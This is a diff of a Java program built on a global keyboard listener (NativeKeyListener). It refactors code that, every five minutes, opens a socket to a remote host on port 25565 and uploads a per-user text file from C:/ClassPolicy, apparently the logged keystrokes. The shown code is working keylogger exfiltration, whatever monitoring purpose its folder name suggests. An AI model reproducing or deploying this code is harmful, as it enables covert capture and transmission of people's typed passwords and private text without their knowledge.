@@ -73,26 +73,7 @@ public class Main implements NativeKeyListener{
 		    int minutes = cal.get(Calendar.MINUTE);
 			 if (minutes % 5 == 0) {
 			    	// send the file
-			    	try {
-			    		//System.out.println(connectTo);
-			    		Socket socket = new Socket(getHostIP(), 25565);
-			    		OutputStream t = socket.getOutputStream();
-			    		PrintWriter out = new PrintWriter(t);
-						String toSend = System.getProperty("user.name") + ".txt";
-						out.print(toSend );
-						out.flush();
-			    		File transferFile = new File ("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt"); 
-			    		byte [] bytearray = new byte [(int)transferFile.length()]; 
-			    		FileInputStream fin = new FileInputStream(transferFile); 
-			    		BufferedInputStream bin = new BufferedInputStream(fin); 
-			    		bin.read(bytearray,0,bytearray.length); 
-			    		OutputStream os = socket.getOutputStream(); 
-			    		// System.out.println(""); 
-			    		os.write(bytearray,0,bytearray.length); 
-			    		os.flush(); 
-			    	} catch (Exception e) {
-			    		System.out.println(e);
-			    	}
+				 upload(getHostIP());
 			    }
 		}
 	}
@@ -188,5 +169,27 @@ public class Main implements NativeKeyListener{
 		 } catch (Exception e) {
 			 return "127.0.0.1";
 		 }
+	 }
+	 public static void upload(String ipee) {
+		 try {
+	    		//System.out.println(connectTo);
+	    		Socket socket = new Socket(getHostIP(), 25565);
+	    		OutputStream t = socket.getOutputStream();
+	    		PrintWriter out = new PrintWriter(t);
+				String toSend = System.getProperty("user.name") + ".txt";
+				out.print(toSend );
+				out.flush();
+	    		File transferFile = new File ("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt"); 
+	    		byte [] bytearray = new byte [(int)transferFile.length()]; 
+	    		FileInputStream fin = new FileInputStream(transferFile); 
+	    		BufferedInputStream bin = new BufferedInputStream(fin); 
+	    		bin.read(bytearray,0,bytearray.length); 
+	    		OutputStream os = socket.getOutputStream(); 
+	    		// System.out.println(""); 
+	    		os.write(bytearray,0,bytearray.length); 
+	    		os.flush(); 
+	    	} catch (Exception e) {
+	    		System.out.println(e);
+	    	}
 	 }
 }
